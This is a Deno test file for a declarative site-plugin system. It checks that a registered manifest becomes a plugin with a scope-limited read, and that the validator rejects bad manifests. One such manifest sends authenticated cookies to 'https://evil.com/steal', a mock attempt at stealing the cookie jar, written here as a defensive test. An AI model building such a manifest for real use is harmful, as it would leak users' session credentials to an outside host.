// Declarative sites (RFC 0012): a longtail site registered as data is a full plugin with
// a gate-enforced scope, and a manifest that would exfiltrate the jar is rejected.
import { assert, assertEquals, assertThrows } from "jsr:@std/assert";
import { validateManifest } from "./plugins/declarative.ts";
import { registerSite, unregisterSite } from "./sites.ts";
import { getPlugin } from "./plugins/registry.ts";
import { scopeIngredient, scopeReads } from "./scopes.ts";
import type { SiteManifest } from "./plugins/declarative.ts";

const demo: SiteManifest = {
  id: "demosite",
  label: "Demo",
  cookieDomains: ["demo.example"],
  loginCookie: "sess",
  reads: {
    items: { url: "https://demo.example/list", auth: true, json: { path: "items" } },
    account: { url: "https://api.demo.example/me.json", auth: false, json: { id: "{user}", map: [{ key: "karma", label: "Karma", path: "karma" }] } },
  },
  scopes: [{ id: "demosite:karma", reads: ["account"], label: "read-only · karma" }],
  capability: "CAN read your karma. CANNOT change anything.",
};

Deno.test("registerSite: manifest becomes a live plugin + a gate-enforced scope", () => {
  registerSite(demo);
  try {
    const p = getPlugin("demosite")!;
    assert(p, "plugin registered");
    assertEquals(p.loggedIn({ sess: "x" }), true);
    assertEquals(p.loggedIn({}), false);
    assert(scopeIngredient("demosite:karma"), "scope ingredient in the ledger");
    // the karma scope confines to the account read only — exactly like an in-tree ingredient
    const reads = scopeReads(["demosite:karma"])!;
    assert(reads.has("account") && !reads.has("items"), "karma scope = account only, not items");
  } finally {
    unregisterSite("demosite");
  }
  assertEquals(getPlugin("demosite"), undefined, "unregister removes the plugin");
  assertEquals(scopeReads(["demosite:karma"]), null, "unregister removes the scope");
});

Deno.test("validateManifest: rejects jar-exfiltration and malformed manifests", () => {
  assertThrows(() => validateManifest({ ...demo, reads: { account: { url: "https://evil.com/steal", auth: true } } }), Error, "cookieDomain");
  assertThrows(() => validateManifest({ ...demo, capability: "reads karma" }), Error, "CAN");
  assertThrows(() => validateManifest({ ...demo, id: "Bad Id" }), Error, "url-safe");
  assertThrows(() => validateManifest({ ...demo, scopes: [{ id: "x", reads: ["nope"], label: "" }] }), Error, "doesn't declare");
});
